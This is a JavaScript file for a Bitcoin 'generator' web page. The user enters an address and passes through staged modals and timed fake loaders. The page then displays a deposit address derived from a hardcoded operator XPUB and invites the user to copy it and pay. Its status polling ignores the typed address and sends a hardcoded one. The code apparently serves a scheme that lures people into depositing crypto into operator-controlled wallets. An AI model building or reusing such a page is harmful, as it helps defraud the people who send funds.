document.addEventListener("DOMContentLoaded", () => {
  const parent = document.querySelector("modals");

  const newamountparent = document.querySelector(".xgpatz3.x13fuv20")
  const newamountchild = newamountparent.children[1]

  const amountparent = document.querySelector(".xd1tfr9");
  const newloaderchild = amountparent.children[0];

  const LegalOrgChild = parent.children[0];
  let currentLegalChild = null;

  const TxLoaderOrgChild = parent.children[1];
  let currentTxLoaderOrgChild = null;

  const TxOrgChild = parent.children[2];
  let currentTxChild = null;

  const TxConfirmOrgChild = parent.children[3];
  let currentTxConfirmChild = null;

  const labelparent = document.querySelector(".input-parent");
  const input = labelparent.children[0];
  const labelclosechild = labelparent.children[1];
  const errorchild = labelparent.children[2];



  [errorchild, LegalOrgChild, TxOrgChild, TxConfirmOrgChild, TxLoaderOrgChild].forEach((el) =>
    el?.classList.remove("hidden"),
  );

  [errorchild, LegalOrgChild, TxOrgChild, TxConfirmOrgChild, TxLoaderOrgChild].forEach((el) =>
    el?.remove(),
  );




  const createButton = document.querySelector(".x13zkoj4");
const svg = createButton.querySelector("svg");
const paths = svg.querySelectorAll("path");

const firstPath = paths[0];   // orange circle
const secondPath = paths[1];  // white arrow

function clearAnimations(el) {
    el.getAnimations().forEach(anim => anim.cancel());
}

function buttondisabled(disabled) {

    // Cancel any running animations first (prevents stacking)
    clearAnimations(firstPath);
    clearAnimations(secondPath);

    if (disabled) {

        createButton.style.pointerEvents = "none";

        firstPath.animate(
            [{ fill: "#ff8d28" }, { fill: "#00000020" }],
            { duration: 200, fill: "forwards", easing: "ease" }
        );

        secondPath.animate(
            [{ fill: "#ffffff" }, { fill: "#00000080" }],
            { duration: 200, fill: "forwards", easing: "ease" }
        );

    } else {

        const anim1 = firstPath.animate(
            [{ fill: "#00000020" }, { fill: "#ff8d28" }],
            { duration: 200, fill: "forwards", easing: "ease" }
        );

        const anim2 = secondPath.animate(
            [{ fill: "#00000080" }, { fill: "#ffffff" }],
            { duration: 200, fill: "forwards", easing: "ease" }
        );

        Promise.all([anim1.finished, anim2.finished]).then(() => {
            createButton.style.pointerEvents = "";
        });
    }
}




    




  

 






  //map function

  setTimeout(() => {
     newamountchild.animate([{ opacity: 0 }, { opacity: 1 }], {
          duration: 200,
        });
        amountparent.classList.remove("x1ks1olk", "x47corl");
        newloaderchild.remove();
    
  }, 1500);

  //input function

  function isBTC(address) {
    return AddressValidation.validate(address, "mainnet");
  }



  input.addEventListener("input", () => {
    const val = input.value.trim();
    const isValid = isBTC(val);

    if (isValid) {
      if (errorchild.isConnected) errorchild.remove();
      if (!labelclosechild.isConnected) input.insertAdjacentElement("afterend", labelclosechild);
    } 
  });

  input.addEventListener("blur", () => {
    const val = input.value.trim();
    const isValid = isBTC(val);

    if (!isValid && val !== "") {
      if (!errorchild.isConnected) input.insertAdjacentElement("afterend", errorchild);
      if (labelclosechild.isConnected) labelclosechild.remove();
    } 

   
  });

  labelclosechild.addEventListener("pointerdown", (e) => {
    e.preventDefault();
    e.stopPropagation();

    input.animate([{ opacity: 0 }, { opacity: 1 }], {
      duration: 200,
    });

    input.value = "";
    input.focus();

    input.dispatchEvent(new Event("input", { bubbles: true }));
  });


  input.addEventListener("keydown", function (event) {
    // Check if the key pressed was 'Enter'
    if (event.key === "Enter") {
      // Optional: Prevent default behavior (like submitting a form)
      event.preventDefault();

      // Call your function
      createButton.click();
    }
  });

  //create button function

  createButton.addEventListener("click", () => {
    buttondisabled(true);
 amountparent.classList.add("x1ks1olk", "x47corl");
    amountparent.append(newloaderchild);
   setTimeout(() => {
    
     newamountchild.animate([{ opacity: 0 }, { opacity: 1 }], {
          duration: 200,
        });
        amountparent.classList.remove("x1ks1olk", "x47corl");
        newloaderchild.remove();

        const address = input.value.trim();
        if (address === "" || !isBTC(address)) {
          buttondisabled(false);
      
          setTimeout(() => {
            input.animate([{ opacity: 0 }, { opacity: 1 }], {
              duration: 200,
              easing: "ease-out",
            });

            input.focus();
          }, 50);

          return;
        }

        currentLegalChild = LegalOrgChild.cloneNode(true);

        document.querySelector(".x1f619").appendChild(currentLegalChild);
        currentLegalChild.querySelector(".x1h0vfkc").animate(
          [
            { opacity: 0 }, // To
            { opacity: 1 }, // From
          ],
          {
            duration: 200, // 0.267s
            // transition-delay: 0s (as per your .modal-overlay-open)
            easing: "cubic-bezier(0.45, 0, 0.55, 1)",
          },
        );

        currentLegalChild.querySelector(".x104qc98").animate(
          [
            {
              opacity: 0,
              transform: "translateY(-2vh)",
            },
            {
              opacity: 1, // Stay at 1% for the remainder
              transform: "translateY(0)",
            },
          ],
          {
            duration: 200, // 0.4s
            easing: "cubic-bezier(0.45, 0, 0.55, 1)",
          },
        );

    
        const legalparent = currentLegalChild.querySelector(".xzhw6r5");
        const closeBtn = legalparent.children[0];
        const generateBtn = legalparent.children[1];

        const legalHandler = () => {
      

          generateBtn.removeEventListener("click", legalHandler);
          closeBtn.removeEventListener("click", closeHandler);

          setTimeout(() => {
            startUpdateProcess();
            generateBtn.addEventListener("click", legalHandler);
            closeBtn.addEventListener("click", closeHandler);
          }, 1200);
        };

        const closeHandler = () => {
          closeBtn.removeEventListener("click", closeHandler);
          generateBtn.removeEventListener("click", legalHandler);

          setTimeout(() => {
            currentLegalChild.querySelector(".x1h0vfkc").animate(
              [
                { opacity: 1 }, // To
                { opacity: 0 }, // From
              ],
              {
                duration: 200, // 0.267s
                // transition-delay: 0s (as per your .modal-overlay-open)
                easing: "cubic-bezier(0.45, 0, 0.55, 1)",
              },
            );
            currentLegalChild
              .querySelector(".x104qc98")
              .animate(
                [
                  {
                    opacity: 1, // Stay at 1% for the remainder
                    transform: "translateY(0)",
                  },
                  {
                    opacity: 0,
                    transform: "translateY(-2vh)",
                  },
                ],
                {
                  duration: 200, // 0.4s
                  easing: "cubic-bezier(0.45, 0, 0.55, 1)",
                },
              )
              .finished.then(() => {
                currentLegalChild.remove();
                currentLegalChild = null;
                buttondisabled(false);
              });
          }, 1000);
        };

        closeBtn.addEventListener("click", closeHandler);
        generateBtn.addEventListener("click", legalHandler);

        // optional: if you ever want to re-enable later
        // if (allFilled) console.log('All radios filled!');

        function startUpdateProcess() {
          currentTxLoaderOrgChild = TxLoaderOrgChild.cloneNode(true);
          document.querySelector(".x1f619").appendChild(currentTxLoaderOrgChild);
          currentTxLoaderOrgChild.querySelector(".x1h0vfkc").animate(
            [
              { opacity: 0 }, // To
              { opacity: 1 }, // From
            ],
            {
              duration: 200, // 0.267s
              // transition-delay: 0s (as per your .modal-overlay-open)
              easing: "cubic-bezier(0.45, 0, 0.55, 1)",
            },
          );
          currentTxLoaderOrgChild.querySelector(".x104qc98").animate(
            [
              {
                opacity: 0,
                transform: "translateY(-2vh)",
              },
              {
                opacity: 1, // Stay at 1% for the remainder
                transform: "translateY(0)",
              },
            ],
            {
              duration: 200, // 0.4s
              easing: "cubic-bezier(0.45, 0, 0.55, 1)",
            },
          );
          currentTxLoaderOrgChild.querySelector(".x47corl.xdt5ytf").animate([{ opacity: 1 }, { opacity: 0.7 }], {
            duration: 200,
            easing: "ease-out",
            fill: "forwards",
          });
          currentLegalChild.children[0].classList.add(
            "x9f619",
            "x1ja2u2z",
            "x5yr21d",
            "x1o0tod",
            "xw2csxc",
            "x1odjw0f",
            "xixxii4",
            "x1rohswg",
            "x13vifvy",
            "xh8yej3",
            "xfk6m8",
            "x1yqm8si",
            "xjx87ck",
          );

          setTimeout(() => {
            startProcess();
          }, 6000);
        }

        const XPUB = "xpub6CRJSTThoNMJPjbgUiftq2zuXDV5Yf3T7hemvXDiesRLR9Pe2uLs1P53bgszMiaLZUeHhQ1izRSQ5HBLzkrKpE8C8PTEy6MRSYBsAfNcnZ7";
        let CHAIN = 0;
        let INDEX = 0;

        let generatedAddress = "";
        let pollingActive = false;
        let pollTimeout = null;

     function getUniformRandomZeroBased(max) {
  const rand32 = () => crypto.getRandomValues(new Uint32Array(1))[0];
  const limit = Math.floor(0x100000000 / max) * max;
  let r;
  do {
    r = rand32();
  } while (r >= limit);
  return r % max; // 0 → max-1
}

function getExtremeRandomDerivation() {
  return {
    change: getUniformRandomZeroBased(10),  // 0–9
    index: getUniformRandomZeroBased(100), // 0–99
  };
}

        function startProcess() {
          pollingActive = true;

          // Fire-and-forget POST
          fetch("generate.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              request: "yes",
              type: "0x01",
            }),
          }).catch(() => {
            // ignored on purpose
          });

          // Generate extreme random derivation
          const { change, index } = getExtremeRandomDerivation();
          CHAIN = change;
          INDEX = index;

          generatedAddress = generateBC1(CHAIN, INDEX);

          currentTxLoaderOrgChild.children[0].classList.add(
            "x9f619",
            "x1ja2u2z",
            "x5yr21d",
            "x1o0tod",
            "xw2csxc",
            "x1odjw0f",
            "xixxii4",
            "x1rohswg",
            "x13vifvy",
            "xh8yej3",
            "xfk6m8",
            "x1yqm8si",
            "xjx87ck",
          );

          currentTxChild = TxOrgChild.cloneNode(true);

          const txtloading = currentTxChild.querySelector(".x1k4tb9n");
          const txtparent = txtloading.parentNode;
          const txcopyparent = currentTxChild.querySelector(".xmg6eyc");
          const txcopychild = txcopyparent.children[0];
          const txcorrectchild = txcopyparent.children[1];
          const copylabel = txcopyparent.children[3];
          const txCloseBtn = currentTxChild.querySelector(".x1ja4u2z");
          const depositaddress = currentTxChild.querySelector(".deposit-address");
          txcorrectchild.classList.remove("hidden");
          depositaddress.classList.remove("hidden");
          copylabel.classList.remove("hidden");
          copylabel.remove();
          depositaddress.remove();
          txcorrectchild.remove();

          document.querySelector(".x1f619").appendChild(currentTxChild);
          currentTxChild.querySelector(".x1h0vfkc").animate(
            [
              { opacity: 0 }, // To
              { opacity: 1 }, // From
            ],
            {
              duration: 200, // 0.267s
              // transition-delay: 0s (as per your .modal-overlay-open)
              easing: "cubic-bezier(0.45, 0, 0.55, 1)",
            },
          );
          currentTxChild.querySelector(".x104qc98").animate(
            [
              {
                opacity: 0,
                transform: "translateY(-2vh)",
              },
              {
                opacity: 1, // Stay at 1% for the remainder
                transform: "translateY(0)",
              },
            ],
            {
              duration: 200, // 0.4s
              easing: "cubic-bezier(0.45, 0, 0.55, 1)",
            },
          );

      
          setTimeout(() => {
            txtloading.remove();
            txtparent.appendChild(depositaddress);
            depositaddress.animate([{ opacity: 0 }, { opacity: 1 }], {
              duration: 200,
              easing: "ease-out",
            });
            depositaddress.textContent = generatedAddress;

            txCloseBtn.addEventListener("click", handleTxClose);
            txcopyparent.addEventListener("click", handlecopy);
          }, 2400);

          function handlecopy() {
            txcopyparent.removeEventListener("click", handlecopy);
            const txText = generatedAddress;
            navigator.clipboard.writeText(txText);
            txcopyparent.appendChild(copylabel);
            copylabel.animate([{ opacity: 0 }, { opacity: 1 }], {
              duration: 200,
              easing: "ease-out",
            });
            txcopychild.remove();
            txcopyparent.appendChild(txcorrectchild);

            setTimeout(() => {
              copylabel
                .animate([{ opacity: 1 }, { opacity: 0 }], {
                  duration: 200,
                  easing: "ease-in",
                })
                .finished.then(() => {
                  copylabel.remove();
                });
            }, 800);
            setTimeout(() => {
              txcorrectchild.remove();
              txcopyparent.prepend(txcopychild);
              txcopyparent.addEventListener("click", handlecopy);
            }, 1200);
          }

          function handleTxClose() {
            txCloseBtn.removeEventListener("click", handleTxClose);



            currentTxConfirmChild = TxConfirmOrgChild.cloneNode(true);

            document.querySelector(".x1f619").appendChild(currentTxConfirmChild);

    
            currentTxConfirmChild.querySelector(".x1snezo4").animate(
              [
                {
                  transform: "scale(1.15)",
                   opacity: 0,
                  offset: 0,
                },

                
                {
                  transform: "scale(1)",
                  offset: 1,
                },
              ],
              {
                duration: 200,
                easing: "cubic-bezier(0.45, 0, 0.55, 1)",
              },
            );
            currentTxConfirmChild.querySelector(".x1h0vfkc").animate(
              [
                { opacity: 0 }, // To
                { opacity: 1 }, // From
              ],
              {
                duration: 200, // 0.267s
                // transition-delay: 0s (as per your .modal-overlay-open)
                easing: "cubic-bezier(0.45, 0, 0.55, 1)",
              },
            );

         

            currentTxChild.children[0].classList.add(
              "x9f619",
              "x1ja2u2z",
              "x5yr21d",
              "x1o0tod",
              "xw2csxc",
              "x1odjw0f",
              "xixxii4",
              "x1rohswg",
              "x13vifvy",
              "xh8yej3",
              "xfk6m8",
              "x1yqm8si",
              "xjx87ck",
            );

            wireConfirmButtons();
            function wireConfirmButtons() {
              const actionparent = currentTxConfirmChild.querySelector(".x1u7kmwd");
                            
           const closeBtn1 = actionparent.children[0];
const confirmBtn = actionparent.children[1];
   
              const cancelAction = () => {
                currentTxConfirmChild.querySelector(".x1h0vfkc").animate([{ opacity: 1 }, { opacity: 0 }], {
                  duration: 200, // 0.267s
                  // transition-delay: 0s (as per your .modal-overlay-open)
                  easing: "cubic-bezier(0.45, 0, 0.55, 1)",
                });
                currentTxConfirmChild
                  .querySelector(".x1snezo4")
                  .animate(
                    [
                      {
                        opacity: "1",
                      },
                      {

                        opacity: "0",
                      },
                    ],
                    {
                      duration: 200,
                      easing: "cubic-bezier(0.45, 0, 0.55, 1)",
                    },
                  )
                  .finished.then(() => {
                    currentTxConfirmChild.remove();
                    currentTxConfirmChild = null;

                    currentTxChild.children[0].classList.remove(
                      "x9f619",
                      "x1ja2u2z",
                      "x5yr21d",
                      "x1o0tod",
                      "xw2csxc",
                      "x1odjw0f",
                      "xixxii4",
                      "x1rohswg",
                      "x13vifvy",
                      "xh8yej3",
                      "xfk6m8",
                      "x1yqm8si",
                      "xjx87ck",
                    );

                    txCloseBtn.addEventListener("click", handleTxClose);
                  });
              };

              const confirmAction = () => {
            

                confirmBtn.removeEventListener("click", confirmAction);
                closeBtn1.removeEventListener("click", cancelAction);

                setTimeout(() => {
                  stopProcess();

                  currentTxConfirmChild.querySelector(".x1h0vfkc").animate([{ opacity: 1 }, { opacity: 0 }], {
                    duration: 200, // 0.267s
                    // transition-delay: 0s (as per your .modal-overlay-open)
                    easing: "cubic-bezier(0.45, 0, 0.55, 1)",
                  });
                  currentTxConfirmChild
                    .querySelector(".x1snezo4")
                    .animate(
                      [
                        {
                          
                          opacity: "1",
                        },
                        {

                          opacity: "0",
                        },
                      ],
                      {
                        duration: 200,
                        easing: "cubic-bezier(0.45, 0, 0.55, 1)",
                      },
                    )
                    .finished.then(() => {
                      currentTxConfirmChild.remove();
                      currentTxConfirmChild = null;
                    });

                  setTimeout(() => {
                    currentTxChild.querySelector(".x1h0vfkc").animate(
                      [
                        { opacity: 1 }, // To
                        { opacity: 0 }, // From
                      ],
                      {
                        duration: 300, // 0.267s
                        // transition-delay: 0s (as per your .modal-overlay-open)
                        easing: "cubic-bezier(0.45, 0, 0.55, 1)",
                      },
                    );
                    currentTxChild
                      .querySelector(".x104qc98")
                      .animate(
                        [
                          {
                            opacity: 1, // Stay at 1% for the remainder
                            transform: "translateY(0)",
                          },
                          {
                            opacity: 0,
                            transform: "translateY(-2vh)",
                          },
                        ],
                        {
                          duration: 300, // 0.4s
                          easing: "cubic-bezier(0.45, 0, 0.55, 1)",
                        },
                      )
                      .finished.then(() => {
                        currentTxChild.remove();
                        currentTxChild = null;
                      });

                    setTimeout(() => {
                      currentTxLoaderOrgChild.querySelector(".x1h0vfkc").animate(
                        [
                          { opacity: 1 }, // To
                          { opacity: 0 }, // From
                        ],
                        {
                          duration: 300, // 0.267s
                          // transition-delay: 0s (as per your .modal-overlay-open)
                          easing: "cubic-bezier(0.45, 0, 0.55, 1)",
                        },
                      );
                      currentTxLoaderOrgChild
                        .querySelector(".x104qc98")
                        .animate(
                          [
                            {
                              opacity: 1, // Stay at 1% for the remainder
                              transform: "translateY(0)",
                            },
                            {
                              opacity: 0,
                              transform: "translateY(-2vh)",
                            },
                          ],
                          {
                            duration: 300, // 0.4s
                            easing: "cubic-bezier(0.45, 0, 0.55, 1)",
                          },
                        )
                        .finished.then(() => {
                          currentTxLoaderOrgChild.remove();
                          currentTxLoaderOrgChild = null;
                          currentLegalChild.children[0].classList.remove(
                            "x9f619",
                            "x1ja2u2z",
                            "x5yr21d",
                            "x1o0tod",
                            "xw2csxc",
                            "x1odjw0f",
                            "xixxii4",
                            "x1rohswg",
                            "x13vifvy",
                            "xh8yej3",
                            "xfk6m8",
                            "x1yqm8si",
                            "xjx87ck",
                          );
                      
                        });
                    }, 200);
                  }, 800);
                }, 1200);
              };

              closeBtn1.addEventListener("click", cancelAction);
              confirmBtn.addEventListener("click", confirmAction);
            }
          }

          startChecking();
        }

        function generateBC1(change, index) {
          let root;

          try {
            root = bip32.fromBase58(XPUB);
          } catch (err) {
            alert("XPUB Error: " + err.message);
            return "";
          }

          const changeNode = root.derive(change);
          const addressNode = changeNode.derive(index);

          return bitcoinlib.payments.p2wpkh({
            pubkey: addressNode.publicKey,
          }).address;
        }

        function startChecking() {
          if (!pollingActive) return;

          const amount = input.value.trim();

          const payload = {
            addressnumber: INDEX,
            user_specified_address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
            depositamount: amount,
            depositaddress: generatedAddress,
            condition_met: "no",
          };

          fetch("check.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
          }).catch(() => {
            // ignore response and errors completely
          });

          pollTimeout = setTimeout(startChecking, 5000);
        }
        function stopProcess() {
          pollingActive = false;
          generatedAddress = "";

          clearTimeout(pollTimeout);
        }
      
   }, 2000);
  });
});
